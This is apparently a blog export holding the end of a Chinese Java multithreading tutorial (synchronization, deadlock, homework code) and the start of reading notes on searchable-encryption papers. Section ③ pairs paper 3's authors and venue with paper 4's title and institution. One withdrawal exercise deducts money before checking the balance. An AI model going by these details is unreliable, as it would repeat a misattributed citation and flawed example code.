程序查看线程状态\n\n```java\npackage com.jwt.threaduse;\n\npublic class ThreadState_ {\n    public static void main(String[] args) throws InterruptedException {\n        Td t = new Td();\n        System.out.println(t.getName() + \" 状态\" + t.getState());\n        t.start();\n        while (Thread.State.TERMINATED != t.getState()) {\n            System.out.println(t.getName() + \" 状态\" + t.getState());\n            Thread.sleep(500);\n        }\n        System.out.println(t.getName() + \" 状态\" + t.getState());\n    }\n}\nclass Td extends Thread {\n    @Override\n    public void run() {\n            for (int i = 0; i < 3; i++) {\n                System.out.println(\"hi \" + i);\n                try {\n                    Thread.sleep(1000);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n    }\n}\n\n```\n\n## 线程的同步\n\n### 线程同步机制\n\n- 1.在多线程编程，一些敏感数据不允许被多个线程同时访问，此时就使用同步访问技术，保证数据在任何同一时刻，最多有一个线程访问，以保证数据的完整性。\n- 2.也可以这样理解：线程同步，即当有一个线程在对内存进行操作时，其他线程都不可以对这个内存地址进行操作，直到该线程完成操作，其他线程才能对该内存地址进行操作。\n\n### 同步方法-Synchronized\n\n- 1.同步代码块\n\n```java\nsynchronized (对象) {//得到对象的锁，才能操作同步代码\n\t//需要被同步代码;\n}\n```\n\n- 2.同步方法\n\n```java\npublic synchronized void m (String name){\n  //需要被同步的代码\n}\n```\n\n## 互斥锁\n\n- 1.Java语言中，引入了对象互斥锁的概念，来保证共享数据操作的完整性。\n- 2.每个对象都对应于一个可称为\"互斥锁\"的标记，这个标记用来保证在任一 时刻，只能有一个线程访问该对象。\n- 3.关键字 synchronized 来与对象的互斥锁联系。当某个对象用 synchronized 修饰时，表明该对象在任一时刻只能由一个线程访问。\n- 4.同步的局限性:导致程序的执行效率降低\n- 5.同步方法(非静态的)的锁可以是 this，也可以是其他对象(要求是同一个对象)\n- 6.同步方法(静态的)的锁为当前类本身。\n\n**使用互斥锁来解决售票问题**\n\n实现的步骤:\n\n- 需要先分析上锁的代码\n- 选择同步代码块或同步方法\n- 要求多个线程的锁对象为同一个即可!\n\n**方法1：代码块加锁**\n\n```java\npackage com.jwt.threaduse;\n\npublic class SellTicket {\n    public static void main(String[] args) {\n\n        //实现接口方式\n        SellTicket02 sellTicket04 = new SellTicket02();\n        Thread thread01 = new Thread(sellTicket04);\n        Thread thread02 = new Thread(sellTicket04);\n        Thread thread03 = new Thread(sellTicket04);\n        thread01.start();\n        thread02.start();\n        thread03.start();\n    }\n}\n\n//实现接口方式\nclass SellTicket02 implements Runnable{\n    private  int ticketNum = 20;//static 让多个线程共享ticketNum\n    private boolean loop = true;//控制run 方法变量\n    @Override\n    public void run() {\n        while(loop){\n            synchronized (this) {\n                if (ticketNum <= 0) {\n                    System.out.println(\"窗口\" + Thread.currentThread().getName() + \"售票结束...\");\n                    loop =false;\n                    break;\n                }\n                System.out.println(\"窗口\" + Thread.currentThread().getName() + \" 售出一张票 \"+\"剩余票数\" + (--ticketNum));\n                try {\n                    Thread.sleep(1000);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n\n            }\n        }\n    }\n}\n```\n\n**方法2：方法加锁**\n\n```java\npackage com.jwt.threaduse;\n\npublic class SellTicket {\n    public static void main(String[] args) {\n        //实现接口方式\n        SellTicket02 sellTicket04 = new SellTicket02();\n        Thread thread01 = new Thread(sellTicket04);\n        Thread thread02 = new Thread(sellTicket04);\n        Thread thread03 = new Thread(sellTicket04);\n        thread01.start();\n        thread02.start();\n        thread03.start();\n    }\n}\n\n\n//实现接口方式\nclass SellTicket02 implements Runnable{\n    private static int ticketNum = 20;//static 让多个线程共享ticketNum\n    private boolean loop = true;//控制run 方法变量\n    public synchronized void sell(){\n                if (ticketNum <= 0) {\n                    System.out.println(\"窗口\" + Thread.currentThread().getName() + \"售票结束...\");\n                    loop =false;\n                    return;\n                }\n                System.out.println(\"窗口\" + Thread.currentThread().getName() + \" 售出一张票 \"+\"剩余票数\" + (--ticketNum));\n                try {\n                    Thread.sleep(50);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n    }\n    @Override\n    public void run() {\n        while(loop){\n            sell();\n            }\n        }\n}\n```\n\n注意：\n\n- 1.同步方法如果没有使用 static 修饰：默认锁对象为this\n- 2.如果方法使用 static 修饰，默认锁对象：当前类.class\n\n## 线程的死锁\n\n多个线程都占用了对方的锁资源，但不肯相让，导致了死锁，在编程是一定要避免死锁的发生。\n\n妈妈:你先完成作业，才让你玩手机\n小明:你先让我玩手机，我才完成作业\n\n例子🌰：\n\n- A 线程先持有 o1 对象，才可以持有 o2 对象\n- B 线程先持有 o2 对象，才可以持有 o1 对象\n\n```java\npackage com.jwt.threaduse;\n\npublic class DeadLock_ {\n    public static void main(String[] args) {\n        //模拟死锁现象\n        DeadLockDemo A = new DeadLockDemo(true);\n        A.setName(\"A 线程\");\n        DeadLockDemo B = new DeadLockDemo(false);\n        B.setName(\"B 线程\");\n        A.start();\n        B.start();\n    }\n}\n\nclass DeadLockDemo extends Thread {\n    static Object o1 = new Object();// 保证多线程，共享一个对象,这里使用static\n    static Object o2 = new Object();\n    boolean flag;\n\n    public DeadLockDemo(boolean flag) {//构造器\n        this.flag = flag;\n    }\n\n    @Override\n    public void run() {\n        //下面业务逻辑的分析\n        //1. 如果flag 为T, 线程A 就会先得到/持有o1 对象锁, 然后尝试去获取o2 对象锁\n        //2. 如果线程A 得不到o2 对象锁，就会Blocked\n        //3. 如果flag 为F, 线程B 就会先得到/持有o2 对象锁, 然后尝试去获取o1 对象锁\n        //4. 如果线程B 得不到o1 对象锁，就会Blocked\n        if (flag) {\n            synchronized (o1) {//对象互斥锁, 下面就是同步代码\n                System.out.println(Thread.currentThread().getName() + \" 进入1\");\n                synchronized (o2) { \n                    System.out.println(Thread.currentThread().getName() + \" 进入2\");\n                }\n            }\n        } else {\n            synchronized (o2) {\n                System.out.println(Thread.currentThread().getName() + \" 进入3\");\n                synchronized (o1) { \n                    System.out.println(Thread.currentThread().getName() + \" 进入4\");\n                }\n\n            }\n        }\n    }\n}\n```\n\n## 释放锁\n\n**下面操作会释放锁**\n\n- 1.当前线程的同步方法、同步代码块执行结束\n  - 案例：上厕所， 完事出来\n- 2.当前线程在同步代码块、同步方法中遇到break、return\n  - 案例：没有正常的完事，经理叫他修改bug，不得已出来\n- 3.当前线程在同步代码块、同步方法中出现了未处理的 Error 或 Exception，导致异常结束\n  - 案例：没有正常的完事，发现马桶坏了，不得已出来\n- 4.当前线程在同步代码块、同步方法中执行了线程对象的 wait() 方法，当前线程暂停，并释放锁。\n  - 案例：没有正常完事，觉得需要酝酿下，所以出来等会再进去\n\n**下面操作不会释放锁**\n\n- 1.线程执行同步代码块或同步方法时，程序调用 Thread.sleep()、 Thread.yield() 方法暂停当前线程的执行，不会释放锁\n  - 案例:上厕所，太困了，在坑位上眯了一会\n- 2.线程执行同步代码块时，其他线程调用了该线程的 suspend() 方法将该线程挂起，该线程不会释放锁。\n  - 提示:应尽量避免使用 suspend() 和 resume() 来控制线程，方法不再推荐使用\n\n## 本章练习\n\n### 1.编程题Homework01.java\n\n- (1)在 main 方法中启动两个线程\n- (2)第 1 个线程循环随机打印 100 以内的整数\n- (3)直到第 2 个线程从键盘读取了 “Q” 命令\n\n```java\npackage com.jwt.threaduse;\n\nimport java.util.Scanner;\n\npublic class Homework01 {\n    public static void main(String[] args) throws InterruptedException {\n        A a = new A();\n        B b = new B(a);\n        Thread thread = new Thread(b);\n        a.start();\n        thread.start();\n    }\n}\nclass A extends Thread{\n    private boolean flag = true;\n    public void setFlag(boolean flag) {\n        this.flag = flag;\n    }\n\n    @Override\n    public void run() {\n        while (flag) {\n            //1-100\n            System.out.println((int)(Math.random()*100 + 1));\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n        System.out.println(\"a线程退出\");\n    }\n}\n\nclass B implements Runnable{\n    private A a;\n    public B(A a) {\n        this.a = a;\n    }\n    @Override\n    public void run() {\n        while (true) {\n            Scanner scanner = new Scanner(System.in);\n            System.out.println(\"请输入指令：\");\n            String s = scanner.nextLine();\n            if (\"Q\".equals(s)) {\n                a.setFlag(false);\n                System.out.println(\"b线程退出\");\n                break;\n            }\n        }\n    }\n}\n```\n\n### 2.编程题Homework02.java\n\n- (1)有 2 个用户分别从同一个卡上取钱(总额: 10000)\n- (2)每次都取 1000，当余额不足时，就不能取款了\n- (3)不能出现超取现象=》线程同步问题\n\n<img src=\"https://img.jwt1399.top/img/image-20220311154710403.png\" style=\"zoom:50%;\" />\n\n```java\npackage com.jwt.threaduse;\n\npublic class Homework02 {\n    //- (1)有 2 个用户分别从同一个卡上取钱(总额: 10000)\n    //- (2)每次都取 1000，当余额不足时，就不能取款了\n    //- (3)不能出现超取现象=》线程同步问题\n    public static void main(String[] args) {\n        Card card = new Card();\n        Thread thread1 = new Thread(card);\n        thread1.setName(\"User1\");\n        Thread thread2 = new Thread(card);\n        thread2.setName(\"User2\");\n        thread1.start();\n        thread2.start();\n    }\n\n}\n\nclass Card implements Runnable{\n    private int money = 10000;\n    @Override\n    public void run() {\n        while (true){\n            //解读\n            //1.这里使用synchronized 实现了线程同步\n            //2.当多个线程执行到这里时，就会去争夺this对象锁\n            //3.哪个线程争夺到(获取)this对象锁， 就执行synchronized 代码块，执行完后， 会释放this对象锁\n            //4.争夺不到this对象锁，就bLocked ，准备继续争夺\n            //5.this对象锁是非公平锁\n            synchronized (this) {\n                money = money - 1000;\n                if (money < 1000) {\n                    System.out.println(\"余额不足\");\n                    break;\n                }\n                System.out.println(Thread.currentThread().getName() + \"取走了1000\" + \"剩余\" + money);\n            }\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n\n##  ❤️Sponsor\n\n您的支持是我不断前进的动力，如果您恰巧财力雄厚，又感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["多线程"],"categories":["JavaSE"]},{"title":"可搜索加密：论文阅读","url":"/posts/30661.html","content":"\n## SE 论文阅读\n\n### 论文清单\n\n| 序号 | 论文名称                                                     | 作者  <br/>年份  | 单位               | 来源             | 等级[CCF](https://www.ccf.org.cn/Academic_Evaluation/NIS/) |\n| ---- | ------------------------------------------------------------ | ---------------- | ------------------ | ---------------- | :--------------------------------------------------------: |\n| 1    | Practical Techniques for Searches on Encrypted Data          | D.Song      2000 | 加州大学伯克利分校 | IEEE S&P         |                             A                              |\n| 2    | Multi-Keyword Fuzzy Search over Encrypted Data               | 王恺璇      2017 | 东北大学           | 计算机研究与发展 |                             ——                             |\n| 3    | Toward Efficient Multi-Keyword Fuzzy Search Over Encrypted Outsourced Data With Accuracy Improvement | 傅张杰2016       | 南京信息工程大学   | IEEE TIFS        |                             A                              |\n| 4    | Efficient dynamic multi-keyword fuzzy search over encrypted cloud data | 洪忠  2020       | 安徽大学           | ELSEVIER JNCA    |                             C                              |\n| 5    | VRFMS: Verifiable Ranked Fuzzy Multi-keyword Search over Encrypted Data | 李兴华      2022 | 西安电子科技大学   | IEEE TSC         |                             B                              |\n| 6    | EliMFS: Achieving Efficient, Leakage-Resilient, and Multi-Keyword Fuzzy Search on Encrypted Cloud Data | 陈静  2017       | 武汉大学           | IEEE TSC         |                             B                              |\n\n### 论文简介\n\n> 如下是对上方清单中论文内容做一个简单的概述，以方便你快速了解论文所研究内容\n\n**[1] Practical Techniques for Searches on Encrypted Data（搜索加密数据的实用技术）**\n\n| 多关键字 | 模糊搜索 | 可验证搜索 |\n| :------: | :------: | :--------: |\n|    ❌     |    ❌     |     ❌      |\n\n- **简要内容：**本文**首次提出**了`一种搜索加密数据的实用技术（SWP）`，该方案通过将明文数据划分成一个个的单词，分别加密每个单词，然后将一个**哈希值**（具有特殊格式）嵌入密文中，服务器可以提取该哈希值，并检查该值是否具有这种特殊格式，确认是否匹配搜索。\n\n------\n\n**[2] Multi-Keyword Fuzzy Search over Encrypted Data（MKFS：面向多关键字的模糊密文搜索方法）**\n\n| 多关键字 | 模糊搜索 | 可验证搜索 |\n| :------: | :------: | :--------: |\n|    ✅     | ✅LSH+BF  |     ❌      |\n\n- **简要内容：**本文提出了`一种面向多关键字的模糊密文搜索方案（MKFS）`，该方案以**布隆过滤器**为基础，使用**对偶编码函数**和**局部敏感哈希函数**来对文件索引进行构建，并使用**距离可恢复加密算法**对该索引进行加密，实现了对**多关键字的密文模糊搜索**。同时方案不需要提前设置索引存储空间，从而大大降低了搜索的复杂度。除此之外，该方案与已有方案相比不需要预定义字典库，降低了存储开销。实验分析和安全分析表明，该方案不仅能够实现面向多关键字的密文模糊搜索，而且保证了方案的机密性和隐私性。\n\n------\n\n**[3] Toward Efficient Multi-Keyword Fuzzy Search Over Encrypted Outsourced Data With Accuracy Improvement（TEMKFS：通过提高准确性，在加密的外包数据上实现高效的多关键字模糊搜索）**\n\n| 多关键字 | 模糊搜索 | 可验证搜索 |\n| :------: | :------: | :--------: |\n|    ✅     | ✅LSH+BF  |     ❌      |\n\n- **简要内容：**本文提出了`一种高效多关键词模糊排名搜索方案`，使用**局部敏感哈希**和**布隆过滤器**来实现**模糊关键字搜索**，首先开发了一种基于 **uni-gram 关键字转换**新方法，它将同时提高准确性并创建处理其他拼写错误的能力。此外，可以使用**词干分析算法**查询具有相同根的关键字。此外，在选择适当的匹配文件集时，该方案会考虑关键字权重。使用真实数据进行的实验表明，我们的方案实际上效率高，精度高。\n\n------\n\n**[4] Efficient dynamic multi-keyword fuzzy search over encrypted cloud data（EDMKFS：对加密的云数据进行高效的动态多关键字模糊搜索）**\n\n| 多关键字 | 模糊搜索 | 可验证搜索 | 动态更新 |\n| :------: | :------: | :--------: | :------: |\n|    ✅     | ✅LSH+BF  |     ❌      |    ✅     |\n\n- **简要内容：**本文提出`一种支持动态文件更新的加密云数据动态多关键字模糊搜索方案`。**局部性敏感散列**和**布隆过滤器**用于生成索引向量和查询向量。基于生成的向量，构建**平衡二叉树**作为整个文件集的索引，并开发**Top-k 搜索算法**，借助索引树搜索与给定查询最相关的 k 个文件。在真实数据集上进行的广泛实验表明，我们的方案比现有的类似方案更有效。\n\n------\n\n**[5] VRFMS: Verifiable Ranked Fuzzy Multi-keyword Search over Encrypted Data（VRFMS：可验证排序模糊多关键字密文搜索）**\n\n| 多关键字 | 模糊搜索 | 可验证搜索 | 动态更新 |\n| :------: | :------: | :--------: | :------: |\n|    ✅     | ✅LSH+BF  |     ✅      |    ✅     |\n\n- **简要内容：**本文提出了`一种高效且可验证排序模糊多关键字密文搜索方案（VRFMS）`，使用**局部敏感哈希**和**布隆过滤器**来实现**模糊关键字搜索**，并采用**词频-逆文档频度（TF-IDF）** 对查询结果进行排序。为了进一步提高搜索准确性，还设计了一种改进的**bi-gram 关键字转换**方法。此外，利用**同态MAC技术**和**随机质询技术**分别验证了返回结果的正确性和完整性。形式安全分析和实证实验表明，VRFMS在实际应用中分别具有安全性和有效性。\n\n------\n\n**[6] EliMFS: Achieving Efficient, Leakage-Resilient, and Multi-Keyword Fuzzy Search on Encrypted Cloud Data（EliMFS：在加密的云数据上实现高效、防泄漏和多关键字模糊搜索）**\n\n| 多关键字 | 模糊搜索 | 可验证搜索 |\n| :------: | :------: | :--------: |\n|    ✅     | ✅LSH+BF  |     ❌      |\n\n- **简要内容：**本文提出了`一种基于加密云数据的高效泄漏弹性多关键字模糊搜索 (EliMFS) 框架`。在这个框架中，利用了一种新颖的**两阶段索引结构**（由正向索引和倒排索引组成）来确保搜索时间与文件集大小无关。多关键字模糊搜索通过基于 **Gram Counting Order**、**布隆过滤器**和**局部敏感散列**的精细设计实现的。此外，考虑到由两阶段索引结构引起的泄漏，我们提出了两种具体的方案来抵抗不同威胁模型中的这些潜在攻击。广泛的分析和实验表明，我们的方案是高效和抗泄漏的。\n\n------\n\n## ①SWP方案\n\n**论文名称：《Practical Techniques for Searches on Encrypted Data》**\n\n该篇论文是 SE 的开山之作，这是首次研究出支持对数据加密后进行搜索的密码技术，提出了第一个实用的可搜索加密方案 SWP，由此开辟了密码学中的全新研究方向——`可搜索加密(Searchable Encryption)`。\n\n- 作者：Dawn Xiaoding Song、D. Wagner, and A. Perrig.S\n- 单位：University of California, Berkeley\n- 刊物：[Proceedings of the 2000 IEEE Symposium on Security and Privacy](http://ieeexplore.ieee.org/abstract/document/848445/)【CCF A】\n- 时间：2000年5月\n- 被引次数：4111（截至2021年1月18日，来源Google Scholar）\n\n### 1、总体思路\n\n该方案通过将明文数据划分成一个个的单词，分别加密每个单词，然后将一个哈希值（具有特殊格式）嵌入密文中，服务器可以提取该哈希值，并检查该值是否具有这种特殊格式，确认是否匹配搜索。\n\n### 2、方案实现\n\n#### 加密过程\n\n![](https://img.jwt1399.top/img/6f0da209ec0491ac9813bd044550f4da_5_Figure_3.png)\n\n- 将明文数据拆分 为固定大小的单词 W<sub>i</sub> \n\n- 并使用确定性加密算法 E 进行加密 E(W<sub>i</sub>) = X<sub>i</sub>   \n\n- 然后将加密的单词 X<sub>i</sub>  划分为左右两部分 X<sub>i</sub> = <L<sub>i</sub>，R<sub>i</sub>>。\n\n- 使用带密钥的 Hash 函数 f 对 L<sub>i </sub>进行哈希运算，k' 为固定密钥，计算得到新密钥 k<sub>i</sub> = f<sub>k'</sub>(L<sub>i</sub>) \n- 借助流密码产生伪随机值 S<sub>i</sub>，用于带密钥的 Hash 函数 F 来对值 S<sub>i</sub> 做哈希运算，以 k<sub>i</sub> 为密钥，得到F<sub>k<sub>i</sub></sub>(S<sub>i</sub>)\n- 将  S<sub>i</sub> 与 ,F<sub>k<sub>i</sub></sub> (S<sub>i</sub>) 拼接得到  Y<sub>i</sub> = <S<sub>i</sub>，F<sub>k<sub>i</sub></sub>(S<sub>i</sub>)>\n- 最终将 Y<sub>i</sub> 与 X<sub>i</sub>  异或得到最后的密文 C<sub>i </sub> = X<sub>i</sub> ⊕ Y<sub>i</sub>，上传至不可信服务器\n\n#### 检索过程\n\n![](https://img.jwt1399.top/img/image-20220119194328708.png)\n\n- 把要查询的关键词对应的 X<sub>i </sub>和 k<sub>i</sub> 告知服务器来进行检索，生成方式与加密过程相同。\n- 服务器得到 X<sub>i</sub> 和  k<sub>i</sub> 后，先计算 Y<sub>i</sub> = C<sub>i</sub> ⊕  X<sub>i</sub> \n- 将 Y<sub>i</sub> 划分为 Y<sub>i</sub>L 和 Y<sub>i</sub>R  ，即 Y<sub>i</sub> = <T<sub>i</sub>L，T<sub>i</sub>R >\n- 使用带密钥的 Hash 函数 F 对  Y<sub>i</sub>L 进行加密，以 k<sub>i</sub> 为密钥，将结果与 Y<sub>i</sub>R 比较，相同则检索成功。\n\n#### 解密过程\n\n- 将 S<sub>i</sub> 划分为 S<sub>i</sub>L 和 S<sub>i</sub>R，C<sub>i</sub> 划分为 C<sub>i</sub>L 和 C<sub>i</sub>R，即 S<sub>i</sub> = < S<sub>i</sub>L，S<sub>i</sub>R>，C<sub>i</sub> = <C<sub>i</sub>L，C<sub>i</sub>R>\n\n- S<sub>i</sub>L 和 C<sub>i</sub>L 异或得到 L<sub>i</sub>，即 L<sub>i</sub> = S<sub>i</sub>L ⊕ C<sub>i</sub>L\n- 使用带密钥的 Hash 函数 f 对 L<sub>i</sub> 进行运算，以 k' 为密钥，得到新的密钥 k<sub>i</sub>\n- 使用带密钥的 Hash 函数 F 对进行加密，以为 k<sub>i</sub> 密钥，得到 F<sub>k<sub>i</sub></sub>(S<sub>i</sub>)\n- F<sub>k<sub>i</sub></sub>(S<sub>i</sub>) 和 C<sub>i</sub>R 异或得到 R<sub>i</sub>，即 R<sub>i</sub> = F<sub>k<sub>i</sub></sub>(S<sub>i</sub>) ⊕ C<sub>i</sub>R\n- 拼接 L<sub>i</sub> 和 R<sub>i </sub>得到 X<sub>i</sub>，使用加密算法 E 的解密算法解密即可\n\n### 3、总结\n\n本文给出的可搜索加密方案，还有很大的可扩展空间：\n\n- ①支持高级的查询：本文涉及的查询都是简单的单个关键字的查询，但是传统的数据库高级语言（SQL语言）却支持更为高级的布尔查询等查询模式，设计一种实现支持析取、合取范式的查询模式也很有必要；另外，模糊查询也可以和可搜索加密技术结合起来。\n- ②支持变长关键字查询：i> 使用固定长度的、足够长的块，从而能够容纳所有的查询关键字；ii>使用变长的关键字，但是在关键字中要包含关键字的字长信息；\n- ③基于索引的查询，基于索引的方案在查询效率上是一般方案的数倍，但是在索引更新上却有很大的提升空间。\n\n看完文章两篇综述和这篇论文后，导师给我的建议是把看论文的重心放在**对称可搜索加密(SSE)**方向上，SSE方案具有计算开销小、算法简单、速度快的特点，导师着重让我看关于基于**索引**的**多关键字查询、模糊查询、可验证的查询**这三个方向。\n\n## ②MKFS方案\n\n**论文名称：《Multi-Keyword Fuzzy Search over Encrypted Data》**\n\n- 作者：王恺璇、李宇溪、周福才、王权琦\n- 单位：东北大学\n- 刊物：[计算机研究与发展](https://crad.ict.ac.cn/CN/10.7544/issn1000-1239.2017.20151125)\n- 时间：2017年5月\n\n### 1、总体思路\n\n该方案利用**布隆过滤器**和**局部敏感哈希函数**技术，来实现**多关键字的密文模糊搜索**。主要研究内容包括:将上传文件利用**对偶编码函数**将其关键字转换成向量,再利用局部敏感哈希函数将其映射到布隆过滤器中；服务器在执行密文搜索时，需要先对输入的查询关键字进行上述转换，再通过计算安全索引参数和陷门的内积来搜索到符合条件的密文文件。\n\n### 2、使用技术\n\n- 局部敏感哈希函数\n- 布隆过滤器\n- 安全近邻算法\n- 对偶编码函数\n\n### 3、方案实现\n\n本方案主要由 4 个主要算法组成：密钥生成算法、索引生成算法、陷门生成算法、搜索算法\n\n- **sk ← KeyGen(1<sup>k</sup> )：密钥生成算法**\n  - 运行于数据拥有者端，用于生成加密索引和查询关键字的密钥。\n  - 输入安全参数 1<sup>k</sup>，输出密钥 sk 。\n\n- **I ← BuildIndex(sk , F , W)：索引生成算法**\n  - 运行于数据拥有者端，用于生成文件对应的安全索引。\n  - 输入密钥 sk 、文件标记序号 F、文件 F 对应的关键词集合 W ，输出安全索引 I 。\n\n- **t ← Trapdoor(sk , Q)：陷门生成算法**\n  - 运行于用户端，用于加密查询关键字集合生成安全陷门。\n  - 输入密钥 sk 、查询关键词集合 Q ，输出安全陷门 t 。\n\n- **F<sub>R</sub> ← Search(I , t)：搜索算法**\n  - 运行于第三方服务器端。用于安全索引与安全陷门的匹配。\n  - 输入安全索引I 和安全陷门 t ，输出文件序列集合 F<sub>R</sub>。\n\n![](https://img.jwt1399.top/img/image-20220125145335142.png)\n\n------\n\n#### 密钥生成算法\n\nsk ← KeyGen(1<sup>k</sup> ) 生成密钥，具体步骤如下(k≥128)：\n\n- （1）随机构建 2 个 k × k 维的矩阵 M<sub>1</sub> , M<sub>2</sub> ∈ Ｒ<sup>k × k</sup>\n\n- （2）随机构建一个 k 维的向量 S ∈ { 0 , 1 }<sup>k</sup> ，且 S 中 0 和 1 的数量需要大致相同\n\n- （3）输出 sk ＝（ M<sub>1</sub> , M<sub>2</sub> , S ）作为**生成加密索引**和**生成陷门**的**密钥**\n\n#### 索引生成算法\n\nI ← BuildIndex(sk , F , W)生成安全索引，具体步骤如下:\n\n- **（1）数据预处理**\n  - 对于文件集合 F = { f<sub>1</sub> , f<sub>2</sub> ,…, f<sub>n</sub> }中的每一个文件 f<sub>i</sub> 所对应的关键字集合 W<sub>i</sub> = { w<sub>1</sub> , w<sub>2</sub> ,…, w<sub>t</sub> }，使用对偶编码函数将其转换成向量集合 V = { v<sub>1</sub> , v<sub>2</sub> ,…, v<sub>t</sub> }，其中每个向量 v<sub>i</sub> ∈ {0,1}<sup>676</sup> ;\n- **（2）构建索引**\n  - ① 为文件 f<sub>i</sub> 构建一个 k bit 的**布隆过滤器 B**<sub>i</sub>，初始化为0 \n  - ②对于向量集合 V = { v<sub>1</sub> , v<sub>2</sub> ,…, v<sub>t</sub> } 中的每个向量 v<sub>i</sub>，使用**局部敏感哈希函数** { H<sub>1</sub> , H<sub>2</sub> ,…, H<sub>l</sub>  } 进行计算(H<sub>1</sub>(v<sub>i</sub>) , H<sub>2</sub>(v<sub>i</sub>) ,…, H<sub>l</sub>(v<sub>i</sub>) )，并将结果插入到布隆过滤器 B<sub>i</sub> 。\n\n- **（3）索引加密**\n- 将密钥 sk 中的 S 表示为 S = (s<sub>1</sub> , s<sub>2</sub> ,…, s<sub>k</sub>)。对于每一个文件 f<sub>i</sub> 所得到的布隆过滤器 B<sub>i</sub>\n  - ① 随机选择参数 r ∈  R\n  - ② 将 B<sub>i</sub>  表示为 B<sub>i</sub> = ( b<sub>1</sub> , b<sub>2</sub> ,…, b<sub>k</sub>)。 B<sub>i</sub>  与 S 具有同样的结构，均为由 {0,1} 组成的 k 位向量。对于 B<sub>i</sub> 中的每一个 b<sub>j</sub> ，\n    - 若在 S 中对应的 s<sub>j</sub> = 1 ，则令 b'<sub>j</sub> =  b''<sub>j</sub> = b<sub>j</sub> \n    - 若在 S 中对应的 s<sub>j</sub> =0，则令 b'<sub>j</sub> = 1/2b<sub>j</sub> + r  、b''<sub>j</sub> = 1/2b<sub>j</sub> - r\n  - ③ 令 B'<sub>i </sub> =  ( b'<sub>1</sub> , b'<sub>2</sub> ,…, b'<sub>k</sub>)，B\"<sub>i </sub> =  ( b\"<sub>1</sub> , b\"<sub>2</sub> ,…, b\"<sub>k</sub>)\n  - ④ 计算 I'<sub>i</sub> = M<sub>1</sub><sup>T</sup> • B'<sub>i </sub> , I\"<sub>i</sub> = M<sub>2</sub><sup>T</sup> • B\"<sub>i </sub> \n  - ⑤ 令  I<sub>i</sub> = (I'<sub>i</sub> ，I\"<sub>i</sub> ) \n  - ⑥输出索引 I = ( F , I<sub>1</sub> , I<sub>2</sub> ,…, I<sub>n</sub> )\n\n#### 陷门生成算法\n\nt ← Trapdoor(sk , Q) 根据查询关键词集合生成安全陷门，具体步骤如下:\n\n- （1）构建一个 k 位的布隆过滤器 B 。\n\n- （2）对于查询关键字集合 Q = { q<sub>1</sub> , q<sub>2</sub> ,…, q<sub>t</sub> }，使用对偶编码将其转换成向量集合 V = { v<sub>1</sub> , v<sub>2</sub> ,…, v<sub>t</sub> } 中每个向量 v<sub>i</sub> ∈ {0,1}<sup>676</sup> ，使用局部敏感哈希函数 { H<sub>1</sub> , H<sub>2</sub> ,…, H<sub>l</sub>  } 进行计算(H<sub>1</sub>(v<sub>i</sub>) , H<sub>2</sub>(v<sub>i</sub>) ,…, H<sub>l</sub>(v<sub>i</sub>) )，并将结果插入到布隆过滤器 B 。\n\n- （3）将密钥 sk 中的 S 表示为 S = (s<sub>1</sub> , s<sub>2</sub> ,…, s<sub>k</sub>)。对于布隆过滤器 B\n\n  - ① 随机选择参数 r' ∈  R\n  - ② 将 B<sub>i</sub>  表示为 B<sub>i</sub> = ( b<sub>1</sub> , b<sub>2</sub> ,…, b<sub>k</sub>)。 B<sub>i</sub>  与 S 具有同样的结构，均为由 {0,1} 组成的 k 位向量。对于 B 中的每一个 b<sub>j</sub> ，\n    - 若在 S 中对应的 s<sub>j</sub> = 0 ，则令 b'<sub>j</sub> =  b''<sub>j</sub> = b<sub>j</sub> ，\n    - 若在 S 中对应的 s<sub>j</sub> = 1，则令 b'<sub>j</sub> = 1/2b<sub>j</sub> + r'  、b''<sub>j</sub> = 1/2b<sub>j</sub> - r'\n  - ③ 令 B' =  ( b'<sub>1</sub> , b'<sub>2</sub> ,…, b'<sub>k</sub>)，B\" =  ( b\"<sub>1</sub> , b\"<sub>2</sub> ,…, b\"<sub>k</sub>)\n  - ④ 计算 t' = M<sub>1</sub><sup>-1</sup> • B' , t\" = M<sub>2</sub><sup>-1</sup> • B\"\n  - ⑤ 令  t = (t'，t\" ) \n  \n- （4）输出陷门 t 。\n\n#### 搜索算法\n\nF<sub>R</sub> ← Search(I , t)服务器根据陷门和加密索引执行搜索，具体步骤如下:\n\n- （1）令 F<sub>R</sub> 为一个初始为空的文件集合\n- （2）将索引 I 表示为 I =  ( F , I<sub>1</sub> , I<sub>2</sub> ,…, I<sub>n</sub> ) 对于每一个 I<sub>i </sub>\n  - ① 将 I<sub>i </sub>表示为 I<sub>i  </sub>= (I'<sub>i</sub> ，I\"<sub>i</sub> ) ，将 t 表示为 t = (t'，t\" ) \n  - ② 计算向量的数量积： R<sub>I</sub> = I'<sub>i</sub> • t'  + I\"<sub>i</sub>  • t\"\n  - ③ 按排序算法将计算的向量内积作排序，将排序序列中的前 *λ* 条记录加入到结果集合 F<sub>R</sub> 中\n- （3）输出 F<sub>R </sub>作为最终搜索结果\n\n### 4、总结\n\n与已有方案相比，本方案不需要提前设置索引存储空间，从而大大降低了搜索的复杂度；同时，该方案不需要预定义字典库，降低了存储开销。\n\nMKFS 没有显示关键字和文件之间的相关性。对于不同文件中相同的关键字，其关键字权重应该不同，在排序时要考虑这种差异。因此，与查询关键字更相关的文件可能不会包含在返回结果中。\n\n## ③TEMKFS方案\n\n**论文名称：《Efficient dynamic multi-keyword fuzzy search over encrypted cloud data》**\n\n- 作者：傅张杰; 吴心乐; 关朝文; 孙兴明; 任奎\n- 单位：安徽大学\n- 来源：[IEEE Transactions on Information Forensics and Security](https://ieeexplore.ieee.org/document/7524700) 【CCF A】\n- 时间：2016年7月\n\n### 